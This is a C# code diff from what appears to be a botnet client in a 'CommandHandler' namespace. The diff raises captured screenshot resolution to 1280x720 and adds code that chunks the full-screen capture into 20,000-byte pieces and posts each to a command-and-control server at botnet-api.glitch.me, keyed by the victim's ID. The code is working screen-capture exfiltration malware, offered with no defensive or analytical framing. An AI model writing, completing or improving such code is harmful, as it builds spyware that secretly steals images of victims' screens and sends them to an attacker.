@@ -18,7 +18,6 @@ namespace CommandHandler
     }
     public class ScreenC
     {
-        public uint id { get; set; }
         public byte[] bytes { get; set; }
     }
     public class FileC
@@ -100,10 +99,42 @@ namespace CommandHandler
         {
             HttpClient client = new HttpClient();
             client.BaseAddress = new Uri("http://botnet-api.glitch.me/");
-            ScreenC screen = new ScreenC { id = Convert.ToUInt32(Id), bytes = bt };
-            string json = new JavaScriptSerializer().Serialize(screen);
-            var resp = client.PostAsync($"/api/v1/screens", new StringContent(json)).Result;
-            resp.EnsureSuccessStatusCode();
+            List<byte[]> btlist = new List<byte[]>();
+            int value = 0;
+            HttpResponseMessage respgl = null;
+            for (int i = 0; i < (bt.Length/20000)+1; i++)
+			{
+                if (bt.Length-value>20000)
+	            {
+                    byte[] btt = new byte[20000];
+                    btlist.Add(btt);
+                    Array.ConstrainedCopy(bt,value,btlist[i],0,20000);
+                    value+=20000;
+	            }
+                else
+	            {
+                    byte[] btt = new byte[bt.Length-value];
+                    btlist.Add(btt);
+                    Array.ConstrainedCopy(bt,value,btlist[i],0,bt.Length - value);
+	            }
+			}
+            for (int i = 0; i < btlist.Count; i++)
+			{
+                if (i==0)
+	            {
+                    ScreenC screen = new ScreenC{ bytes = btlist[i]};
+                    string json = new JavaScriptSerializer().Serialize(screen);
+                    respgl = await client.PostAsync($"/api/v1/screens/{Id}", new StringContent(json));
+                    respgl.EnsureSuccessStatusCode();
+	            }
+                else
+	            {
+                    ScreenC screen = new ScreenC{ bytes = btlist[i]};
+                    string json = new JavaScriptSerializer().Serialize(screen);
+                    var resp = await client.PostAsync($"/api/v1/screens/{Id}/{respgl.Content.ReadAsStringAsync().Result}", new StringContent(json));
+                    resp.EnsureSuccessStatusCode();
+	            }
+			}
         }
         public static async Task IpDeleteAsync(string Id)
         {
@@ -331,13 +362,12 @@ namespace CommandHandler
             graph.CopyFromScreen(0, 0, 0, 0, new Size(size.Width, size.Height));
             graph.InterpolationMode = InterpolationMode.Bicubic;
             MemoryStream ms = new MemoryStream();
-            Bitmap bmpToSend = new Bitmap(bmp, 200, 200);
+            Bitmap bmpToSend = new Bitmap(bmp, 1280, 720);
             Graphics graphToSend = Graphics.FromImage(bmpToSend);
             graphToSend.CompositingQuality = CompositingQuality.HighQuality;
             graphToSend.SmoothingMode = SmoothingMode.HighQuality;
             graphToSend.InterpolationMode = InterpolationMode.HighQualityBicubic;
             graphToSend.InterpolationMode = InterpolationMode.Bicubic;
-            bmpToSend.Save(@"C:\Users\Павел\Desktop\123321.jpeg",ImageFormat.Jpeg);
             bmpToSend.Save(ms, ImageFormat.Jpeg);
             byte[] imagebt = new byte[3110400];
             imagebt = ms.ToArray();
